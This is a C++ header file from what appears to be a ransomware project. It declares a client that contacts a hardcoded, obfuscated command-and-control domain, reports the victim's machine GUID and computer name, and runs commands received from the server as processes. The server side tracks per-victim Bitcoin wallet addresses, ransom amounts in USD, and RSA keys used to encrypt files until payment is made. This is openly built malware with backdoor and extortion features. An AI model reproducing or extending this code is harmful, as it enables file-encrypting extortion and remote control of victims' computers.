#pragma once

#include "ProcessManager.h"
#include "Framework.h"
#include "NetworkTypes.h"
#include "NetworkCommon.h"
#include "Win32Natives.h"
#include "Syscalls.h"
#include "LogicateCryptography.h"

#include "External/obfuscate.h"
#include "External/base64.h"

#include <memory>
#include <algorithm>
#include <thread>
#include <random>
#include <filesystem>

#define WIN32_LEAN_AND_MEAN

const unsigned int UDP_PORT = 0x154E;
const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));

// info for receiving a command from the server
// inspect the 'Packet' and construct a 'CommandDescription'
// based on the information received.
// process is then created using these fields.
struct CommandDescription {
    unsigned int creationFlags;
    HANDLE creationContext;
    std::wstring application;
    std::wstring commandArgs = L"/K ";
    BOOL respondToServer; // server wants client to respond with status
};

typedef CommandDescription CMDDESC;

class Client {
public:
    const std::string  GetDesktopName()   const { return this->m_ComputerName; }
    const std::string  GetMachineGUID()   const { return this->m_MachineGUID; }
    const RSAKeys      GetRansomSecrets() const { return this->m_RansomSecrets; }
    void               SetDesktopName(auto name) { this->m_ComputerName = name; }
    void               SetMachineGUID(auto name) { this->m_MachineGUID = name; }
    void               SetRequestSecrets(RSAKeys& keys) { this->m_RequestSecrets = keys; }
    void               SetRansomSecrets(RSAKeys& keys) { this->m_RansomSecrets = keys; }

#ifdef CLIENT_RELEASE                               // Client only methods
public:
    Client();
    ~Client();

    BOOL               Connect();                   // Connect to the tcp server
    BOOL               Disconnect();                // Disconnect from the tcp server
    BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
    BOOL               SendMessageToServer(const Server& dest, ClientMessage message);
    BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
    BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
    void               ListenForServerCommands();   // listen for commands from the server and perform them
    BOOL               PerformCommand(const Packet& command, ClientResponse& outResponse); // Perform a command from the tcp server
    const CMDDESC      CreateCommandDescription(const Packet& command);

private:
    void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
    void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
    BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
    BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
    BOOL               IsServerAwaitingResponse(const Packet& commandPerformed);
    BOOL               ExchangePublicKeys();        // send client public key, receive server public key
    Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 

    ProcessManager     m_ProcMgr          = {};     // remote host process manager
    Server             m_TCPServerDetails = {};     // details describing the tcp server
    Server             m_UDPServerDetails = {};     // details about the UDP communication
    RSA*               m_ServerPublicKey  = {};
    SOCKET             m_UDPSocket        = INVALID_SOCKET;

#elif defined(SERVER_RELEASE)                       // Server only client implementation
public:
    Client() = default;
    Client(SOCKET tcp, sockaddr_in addr);

    void               Disconnect();                // clean up and close sockets. free bio* secrets
    const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
    const SOCKET       GetSocket()                 const { return this->m_TCPSocket; }
    const RSAKeys&     GetRequestSecrets()         const { return this->m_RequestSecrets; }

    std::string        UniqueBTCWalletAddress;      // Wallet address to send ransom money to
    long               RansomAmountUSD  = 0;        // amount the client must pay for rsa private key in usd
    long               ClientUID        = -1;       // unique client id for the server
    sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
    BOOL               Alive            = TRUE;
    RSA*               ClientPublicKey = {};
    BOOL               ExpectingResponse = FALSE;
#endif

private:
    std::string        m_ComputerName = "";       // remote host computer name. e.g DESKTOP-AJDU31S
    std::string        m_MachineGUID = "";       // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....    
    RSAKeys            m_RequestSecrets = {};       // RSA key pair used to encrypt and decrypt requests to and from server
    RSAKeys            m_RansomSecrets = {};       // RSA key pair used to encrypt and decrypt files. public key only stored on client until ransom is paid
    SOCKET             m_TCPSocket = INVALID_SOCKET;
};
